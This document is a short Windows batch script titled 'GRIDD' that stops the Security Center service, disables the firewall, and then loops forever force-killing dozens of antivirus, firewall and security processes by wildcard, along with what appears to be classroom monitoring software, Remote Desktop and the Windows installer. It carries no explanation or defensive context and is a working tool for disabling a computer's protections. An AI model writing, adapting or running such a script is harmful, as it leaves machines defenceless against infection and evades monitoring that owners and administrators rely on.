@echo off
cls
color 4f
title GRIDD
net stop “Security Center”
netsh firewall set opmode mode=disable
cls
echo ..######...########..####.########..########.
echo .##....##..##.....##..##..##.....##.##.....##
echo .##........##.....##..##..##.....##.##.....##
echo .##...####.########...##..##.....##.##.....##
echo .##....##..##...##....##..##.....##.##.....##
echo .##....##..##....##...##..##.....##.##.....##
echo ..######...##.....##.####.########..########.
                                    
echo .
echo .
:loop
Taskkill /F /IM student.exe >NUL
Taskkill /F /IM mstsc.exe >NUL
Taskkill /F /IM av* >NUL
Taskkill /F /IM fire* >NUL
Taskkill /F /IM anti* >NUL
Taskkill /F /IM spy* >NUL
Taskkill /F /IM bullguard >NUL
Taskkill /F /IM PersFw >NUL
Taskkill /F /IM KAV* >NUL
Taskkill /F /IM ZONEALARM >NUL
Taskkill /F /IM SAFEWEB >NUL
Taskkill /F /IM spy* >NUL
Taskkill /F /IM bullguard >NUL
Taskkill /F /IM PersFw >NUL
Taskkill /F /IM KAV* >NUL
Taskkill /F /IM ZONEALARM >NUL
Taskkill /F /IM SAFEWEB >NUL
Taskkill /F /IM OUTPOST >NUL
Taskkill /F /IM nv* >NUL
Taskkill /F /IM nav* >NUL
Taskkill /F /IM F-* >NUL
Taskkill /F /IM ESAFE >NUL
Taskkill /F /IM cle >NUL
Taskkill /F /IM BLACKICE >NUL
Taskkill /F /IM def* >NUL
Taskkill /F /IM kav >NUL
Taskkill /F /IM kav* >NUL
Taskkill /F /IM avg* >NUL
Taskkill /F /IM ash* >NUL
Taskkill /F /IM aswupdsv >NUL
Taskkill /F /IM ewid* >NUL
Taskkill /F /IM guard* >NUL
Taskkill /F /IM guar* >NUL
Taskkill /F /IM gcasDt* >NUL
Taskkill /F /IM msmp* >NUL
Taskkill /F /IM mcafe* >NUL
Taskkill /F /IM mghtml >NUL
Taskkill /F /IM msiexec >NUL
Taskkill /F /IM outpost >NUL
Taskkill /F /IM isafe >NUL
Taskkill /F /IM zap*cls >NUL
Taskkill /F /IM zauinst >NUL
Taskkill /F /IM upd* >NUL
Taskkill /F /IM zlclien* >NUL
Taskkill /F /IM minilog >NUL
Taskkill /F /IM cc* >NUL
Taskkill /F /IM norton* >NUL
Taskkill /F /IM ccc* >NUL
Taskkill /F /IM npfmn* >NUL
Taskkill /F /IM loge* >NUL
Taskkill /F /IM nisum* >NUL
Taskkill /F /IM issvc >NUL
Taskkill /F /IM tmp* >NUL
Taskkill /F /IM tmn* >NUL
Taskkill /F /IM pcc* >NUL
Taskkill /F /IM cpd* >NUL
Taskkill /F /IM pop* >NUL
Taskkill /F /IM pav* >NUL
Taskkill /F /IM padmincls >NUL
Taskkill /F /IM panda* >NUL
Taskkill /F /IM avsch* >NUL
Taskkill /F /IM sche* >NUL
Taskkill /F /IM syman* >NUL
Taskkill /F /IM virus* >NUL
Taskkill /F /IM realm*cls >NUL
Taskkill /F /IM sweep* >NUL
Taskkill /F /IM scan* >NUL
Taskkill /F /IM ad-* >NUL
Taskkill /F /IM safe* >NUL
Taskkill /F /IM avas* >NUL
Taskkill /F /IM norm* >NUL
Taskkill /F /IM offg* >NUL
goto loop